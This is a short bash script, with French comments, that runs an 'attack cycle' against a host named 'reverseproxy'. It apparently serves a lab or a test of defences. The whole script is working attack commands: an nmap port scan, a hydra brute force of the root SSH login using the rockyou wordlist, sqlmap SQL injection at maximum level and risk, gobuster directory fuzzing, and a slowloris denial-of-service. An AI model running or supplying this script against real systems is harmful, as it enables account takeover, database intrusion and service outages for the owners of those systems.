#!/bin/bash

echo "[*] New attack cycle started at $(date)"

# Scan léger
nmap -p 22,80,443 reverseproxy

# Bruteforce SSH basique
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://reverseproxy -t 4

# SQL Injection testing
sqlmap -u "http://reverseproxy/login" --batch --level=5 --risk=3

# Fuzzing répertoires
gobuster dir -u http://reverseproxy/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

# Slowloris DOS
slowloris reverseproxy -p 80 -s 200 -v

echo "[*] Attack cycle completed at $(date)"
